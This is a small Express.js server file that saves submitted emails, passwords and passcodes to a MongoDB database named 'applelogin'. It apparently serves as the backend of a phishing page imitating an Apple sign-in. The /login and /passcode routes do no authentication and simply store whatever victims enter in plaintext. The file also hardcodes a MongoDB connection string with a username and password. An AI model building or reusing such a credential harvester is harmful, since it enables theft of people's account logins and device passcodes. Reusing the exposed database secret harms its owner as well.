import express from "express";
import cors from "cors";
import mongoose from "mongoose";
import path from "path";
import { fileURLToPath } from "url";

// __dirname workaround
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB connection
mongoose.connect("mongodb+srv://rishivishwa4877:rishiMongodb@cluster0.k16x7.mongodb.net/applelogin", {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

// Schemas
const User = mongoose.model("User", new mongoose.Schema({ email: String, password: String }));
const Passcode = mongoose.model("Passcode", new mongoose.Schema({ passcode: String }));

// Serve static
app.use(express.static(path.join(__dirname, "../client")));

// Routes
app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    const user = new User({ email, password });
    await user.save();
    res.json({ message: "User saved to MongoDB!" });
    console.log("login saved");
});

app.post("/passcode", async (req, res) => {
    const { passcode } = req.body;
    const user = new Passcode({ passcode });
    await user.save();
    res.json({ message: "Passcode saved to MongoDB!" });
    console.log("passcode saved");
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "../client/index.html"));
});

export default app;
